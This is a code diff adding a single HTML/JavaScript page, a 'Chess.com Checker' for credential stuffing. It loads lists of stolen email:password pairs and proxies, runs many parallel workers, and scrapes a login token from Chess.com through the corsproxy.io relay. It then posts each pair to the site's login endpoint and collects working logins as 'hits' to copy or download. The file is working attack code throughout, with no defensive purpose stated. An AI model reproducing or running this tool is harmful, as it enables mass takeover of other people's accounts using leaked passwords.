@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chess.com Checker</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
+        .container{max-width:1400px;margin:0 auto;padding:20px}
+        header{text-align:center;padding:20px;border-bottom:1px solid #21262d;margin-bottom:20px}
+        header h1{font-size:2em;color:#58a6ff}header p{color:#8b949e;margin-top:5px}
+        .main-grid{display:grid;grid-template-columns:400px 1fr;gap:20px}
+        .panel{display:flex;flex-direction:column;gap:15px}
+        .card{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:15px}
+        .card h3{margin-bottom:12px;color:#58a6ff;font-size:1.1em}
+        textarea{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px;border-radius:6px;resize:vertical;font-family:'Consolas',monospace;font-size:13px}
+        textarea:focus{outline:none;border-color:#58a6ff}
+        .file-upload{margin-top:10px;position:relative}
+        .file-upload input[type="file"]{display:none}
+        .file-upload label{display:inline-block;background:#21262d;color:#58a6ff;padding:8px 15px;border-radius:6px;cursor:pointer;font-size:13px;border:1px solid #30363d}
+        .file-upload label:hover{background:#30363d}
+        .stats-mini{margin-top:8px;font-size:12px;color:#8b949e}
+        .setting-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+        .setting-row label{color:#8b949e}
+        .setting-row input[type="number"]{width:80px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:4px;text-align:center}
+        .buttons-card{display:flex;gap:10px;flex-wrap:wrap}
+        .btn{padding:10px 20px;border:none;border-radius:6px;cursor:pointer;font-size:14px;font-weight:600;transition:all 0.2s}
+        .btn:disabled{opacity:0.5;cursor:not-allowed}
+        .btn-start{background:#238636;color:white;flex:1}.btn-start:hover:not(:disabled){background:#2ea043}
+        .btn-stop{background:#da3633;color:white;flex:1}.btn-stop:hover:not(:disabled){background:#f85149}
+        .btn-clear{background:#21262d;color:#c9d1d9}.btn-clear:hover{background:#30363d}
+        .stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:15px}
+        .stat-box{background:#0d1117;padding:12px;border-radius:6px;text-align:center;border:1px solid #21262d}
+        .stat-label{font-size:11px;color:#8b949e;margin-bottom:5px}
+        .stat-value{font-size:1.4em;font-weight:bold}
+        .stat-value.hit{color:#3fb950}.stat-value.bad{color:#f85149}
+        .progress-bar{width:100%;height:6px;background:#21262d;border-radius:3px;overflow:hidden;margin-bottom:5px}
+        .progress-fill{height:100%;background:#58a6ff;width:0%;transition:width 0.3s}
+        .progress-text{text-align:center;font-size:12px;color:#8b949e}
+        .hits-header{display:flex;align-items:center;gap:10px;margin-bottom:10px;flex-wrap:wrap}
+        .hits-header span{font-size:13px;color:#3fb950}
+        .btn-small{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:5px 12px;border-radius:4px;cursor:pointer;font-size:12px}
+        .btn-small:hover{background:#30363d}
+        .hits-box{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:10px;max-height:300px;overflow-y:auto;font-family:'Consolas',monospace;font-size:13px}
+        .hits-box .hit-entry{color:#3fb950;padding:4px 0;border-bottom:1px solid #21262d}
+        .empty-state{color:#484f58;text-align:center;padding:20px}
+        .log-box{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:10px;max-height:200px;overflow-y:auto;font-family:'Consolas',monospace;font-size:12px}
+        .log-entry{padding:3px 0;border-bottom:1px solid #21262d;color:#8b949e}
+        .log-entry.success{color:#3fb950}.log-entry.error{color:#f85149}
+        @media(max-width:900px){.main-grid{grid-template-columns:1fr}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>♟️ Chess.com Checker</h1>
+            <p>Account Checker with Proxy Support</p>
+        </header>
+
+        <div class="main-grid">
+            <div class="panel">
+                <div class="card">
+                    <h3>📁 Combo List</h3>
+                    <textarea id="comboInput" placeholder="email:password&#10;user1@gmail.com:pass123&#10;user2@yahoo.com:pass456" rows="8"></textarea>
+                    <div class="file-upload">
+                        <input type="file" id="comboFile" accept=".txt">
+                        <label for="comboFile">📂 Upload File</label>
+                    </div>
+                    <div class="stats-mini"><span id="comboCount">0 Accounts</span></div>
+                </div>
+
+                <div class="card">
+                    <h3>🌐 Proxy List</h3>
+                    <textarea id="proxyInput" placeholder="ip:port&#10;127.0.0.1:8080&#10;user:pass@proxy.com:8000" rows="6"></textarea>
+                    <div class="file-upload">
+                        <input type="file" id="proxyFile" accept=".txt">
+                        <label for="proxyFile">📂 Upload File</label>
+                    </div>
+                    <div class="stats-mini"><span id="proxyCount">0 Proxies</span></div>
+                </div>
+
+                <div class="card">
+                    <h3>⚙️ Settings</h3>
+                    <div class="setting-row"><label>Threads:</label><input type="number" id="threads" value="20" min="1" max="200"></div>
+                    <div class="setting-row"><label>Timeout (s):</label><input type="number" id="timeout" value="20" min="5" max="60"></div>
+                </div>
+
+                <div class="card buttons-card">
+                    <button id="startBtn" class="btn btn-start">▶️ Start Check</button>
+                    <button id="stopBtn" class="btn btn-stop" disabled>⏹ Stop</button>
+                    <button id="clearBtn" class="btn btn-clear">🗑 Clear</button>
+                </div>
+            </div>
+
+            <div class="panel">
+                <div class="card">
+                    <h3>📊 Statistics</h3>
+                    <div class="stats-grid">
+                        <div class="stat-box"><div class="stat-label">Total</div><div class="stat-value" id="statTotal">0</div></div>
+                        <div class="stat-box"><div class="stat-label">Checked</div><div class="stat-value" id="statChecked">0</div></div>
+                        <div class="stat-box"><div class="stat-label">Hits</div><div class="stat-value hit" id="statHits">0</div></div>
+                        <div class="stat-box"><div class="stat-label">Bad</div><div class="stat-value bad" id="statBad">0</div></div>
+                        <div class="stat-box"><div class="stat-label">CPM</div><div class="stat-value" id="statCPM">0</div></div>
+                        <div class="stat-box"><div class="stat-label">Time</div><div class="stat-value" id="statTime">0s</div></div>
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
+                    <div class="progress-text" id="progressText">0%</div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Hits</h3>
+                    <div class="hits-header">
+                        <span id="hitsCount">0 Hits</span>
+                        <button id="copyHits" class="btn-small">📋 Copy All</button>
+                        <button id="downloadHits" class="btn-small">💾 Download</button>
+                    </div>
+                    <div class="hits-box" id="hitsBox"><div class="empty-state">No hits yet...</div></div>
+                </div>
+
+                <div class="card">
+                    <h3>📝 Log</h3>
+                    <div class="log-box" id="logBox"><div class="log-entry">[System] Ready...</div></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let combos=[],proxies=[],hits=[],checked=0,bad=0,running=false,startTime=null,proxyIndex=0;
+        const comboInput=document.getElementById('comboInput'),proxyInput=document.getElementById('proxyInput');
+        const comboFile=document.getElementById('comboFile'),proxyFile=document.getElementById('proxyFile');
+        const comboCount=document.getElementById('comboCount'),proxyCount=document.getElementById('proxyCount');
+        const threadsInput=document.getElementById('threads'),timeoutInput=document.getElementById('timeout');
+        const startBtn=document.getElementById('startBtn'),stopBtn=document.getElementById('stopBtn'),clearBtn=document.getElementById('clearBtn');
+        const hitsBox=document.getElementById('hitsBox'),hitsCount=document.getElementById('hitsCount'),logBox=document.getElementById('logBox');
+        const copyHits=document.getElementById('copyHits'),downloadHits=document.getElementById('downloadHits');
+        const progressBar=document.getElementById('progressBar'),progressText=document.getElementById('progressText');
+
+        comboInput.addEventListener('input',updateComboCount);
+        proxyInput.addEventListener('input',updateProxyCount);
+        comboFile.addEventListener('change',e=>{let f=e.target.files[0];if(!f)return;let r=new FileReader();r.onload=ev=>{comboInput.value=ev.target.result;updateComboCount();addLog('Loaded combos','success')};r.readAsText(f)});
+        proxyFile.addEventListener('change',e=>{let f=e.target.files[0];if(!f)return;let r=new FileReader();r.onload=ev=>{proxyInput.value=ev.target.result;updateProxyCount();addLog('Loaded proxies','success')};r.readAsText(f)});
+        startBtn.addEventListener('click',startCheck);
+        stopBtn.addEventListener('click',()=>{running=false;startBtn.disabled=false;stopBtn.disabled=true;addLog('Stopped')});
+        clearBtn.addEventListener('click',()=>{comboInput.value='';proxyInput.value='';hitsBox.innerHTML='<div class="empty-state">No hits yet...</div>';logBox.innerHTML='<div class="log-entry">[System] Cleared</div>';combos=[];proxies=[];hits=[];checked=0;bad=0;updateComboCount();updateProxyCount();updateStats()});
+        copyHits.addEventListener('click',()=>{if(!hits.length)return alert('No hits!');navigator.clipboard.writeText(hits.join('\n')).then(()=>alert('Copied!'))});
+        downloadHits.addEventListener('click',()=>{if(!hits.length)return alert('No hits!');let b=new Blob([hits.join('\n')],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='chess_hits_'+hits.length+'.txt';a.click()});
+
+        function updateComboCount(){combos=comboInput.value.split('\n').filter(l=>l.trim()&&l.includes(':'));comboCount.textContent=combos.length+' Accounts'}
+        function updateProxyCount(){proxies=proxyInput.value.split('\n').filter(l=>l.trim());proxyCount.textContent=proxies.length+' Proxies'}
+        function getNextProxy(){if(!proxies.length)return null;let p=proxies[proxyIndex%proxies.length];proxyIndex++;return p.includes('://')?p:'http://'+p}
+
+        async function checkAccount(email,password,proxy){
+            try{
+                let s=await fetch('https://corsproxy.io/?'+encodeURIComponent('https://www.chess.com/login_and_go?returnUrl=https://www.chess.com/'),{headers:{'User-Agent':'Mozilla/5.0'}});
+                let html=await s.text();
+                let csrf='';
+                let m=html.match(/name="_token"[^>]*value="([^"]+)"/);
+                if(m)csrf=m[1];
+                if(!csrf){m=html.match(/_token:\s*"([^"]+)"/);if(m)csrf=m[1]}
+                if(!csrf)return false;
+
+                let fd=new URLSearchParams();fd.append('_token',csrf);fd.append('username',email);fd.append('password',password);fd.append('remember','on');
+                let r=await fetch('https://corsproxy.io/?'+encodeURIComponent('https://www.chess.com/login_check'),{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0','Origin':'https://www.chess.com','Referer':'https://www.chess.com/login_and_go?returnUrl=https://www.chess.com/'},body:fd.toString(),redirect:'manual'});
+                
+                if(r.status===301||r.status===302||r.status===303){
+                    let loc=r.headers.get('Location')||'';
+                    if(loc&&!loc.toLowerCase().includes('login'))return true;
+                }
+                return false;
+            }catch(e){return false}
+        }
+
+        async function worker(){
+            while(running&&checked<combos.length){
+                let idx=checked;checked++;
+                let[email,password]=combos[idx].split(':');if(!email||!password)continue;
+                let proxy=proxies.length?getNextProxy():null;
+                if(await checkAccount(email.trim(),password.trim(),proxy)){hits.push(email.trim()+':'+password.trim());addHit(email.trim()+':'+password.trim());addLog('[✓] '+email,'success')}else{bad++}
+                updateStats()
+            }
+        }
+
+        function startCheck(){
+            updateComboCount();updateProxyCount();
+            if(!combos.length)return alert('Add combos!');
+            running=true;checked=0;bad=0;hits=[];startTime=Date.now();hitsBox.innerHTML='';proxyIndex=0;
+            startBtn.disabled=true;stopBtn.disabled=false;
+            let tc=Math.min(+threadsInput.value,combos.length);
+            addLog('Starting '+tc+' threads for '+combos.length+' accounts...');
+            for(let i=0;i<tc;i++)worker();
+            let iv=setInterval(()=>{updateStats();if(!running||checked>=combos.length){clearInterval(iv);if(checked>=combos.length){running=false;startBtn.disabled=false;stopBtn.disabled=true;addLog('Done! '+hits.length+' hits','success')}}},1000)
+        }
+
+        function addHit(t){let d=document.createElement('div');d.className='hit-entry';d.textContent=t;if(hitsBox.querySelector('.empty-state'))hitsBox.innerHTML='';hitsBox.prepend(d);hitsCount.textContent=hits.length+' Hits'}
+        function addLog(m,s=''){let d=document.createElement('div');d.className='log-entry '+s;d.textContent='['+new Date().toLocaleTimeString()+'] '+m;logBox.prepend(d);while(logBox.children.length>100)logBox.removeChild(logBox.lastChild)}
+        function updateStats(){
+            document.getElementById('statTotal').textContent=combos.length;
+            document.getElementById('statChecked').textContent=checked;
+            document.getElementById('statHits').textContent=hits.length;
+            document.getElementById('statBad').textContent=bad;
+            if(startTime&&checked>0){let m=(Date.now()-startTime)/60000;document.getElementById('statCPM').textContent=m>0?Math.round(checked/m):0}
+            if(startTime){let s=Math.floor((Date.now()-startTime)/1000);document.getElementById('statTime').textContent=Math.floor(s/60)+'m '+s%60+'s'}
+            let p=combos.length>0?Math.round(checked/combos.length*100):0;progressBar.style.width=p+'%';progressText.textContent=p+'%'
+        }
+        updateComboCount();updateProxyCount();
+    </script>
+</body>
+</html>
